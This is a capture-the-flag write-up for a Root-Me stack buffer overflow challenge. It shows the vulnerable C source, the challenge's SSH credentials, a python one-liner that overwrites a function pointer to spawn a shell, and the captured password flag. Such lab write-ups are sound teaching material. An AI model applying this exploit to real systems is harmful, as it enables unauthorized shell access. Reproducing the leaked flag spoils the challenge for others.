# ELF x86 - Stack buffer overflow basic 2 
https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-2
```
Environment configuration :

PIE 	        Position Independent Executable 	 No 
RelRO 	        Read Only relocations 	                 No 
NX 	        Non-Executable Stack 	                 No 
Heap exec 	Non-Executable Heap 	                 No 
ASLR 	        Address Space Layout Randomization 	 No 
SF 	        Source Fortification 	                 No 
SRC 	        Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch15@challenge02.root-me.org    
Username	app-systeme-ch15
Password	app-systeme-ch15
```

The source code is:
```c
/*
gcc -m32 -fno-stack-protector -o ch15 ch15.c
*/

#include <stdio.h>
#include <stdlib.h>

void shell() {
    system("/bin/dash");
}

void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}

main()
{
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```

This challenge is pretty basic.<br>
The local variables present in the stack, one after the other.<br>
So basically, we need to write 128 junk bytes to fill _buf_ and then the value of _func_ that we'll like. Just for testing:
```gdb
(gdb) run < <(python -c "print 'A'*128 + 'DDDD'")
Starting program: /challenge/app-systeme/ch15/ch15 < <(python -c "print 'A'*128 + 'DDDD'")

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```
Yep it worked :sunglasses:<br>
So let's replace 'DDDD' with the address of **shell** (0x8048464) and get our shell:
```sh
app-systeme-ch15@challenge02:~$ cat <(python -c "print 'A'*128 + '\x64\x84\x04\x08'") - | ./ch15 
whoami
app-systeme-ch15-cracked
cat .passwd
B33r1sSoG0oD4y0urBr4iN
```
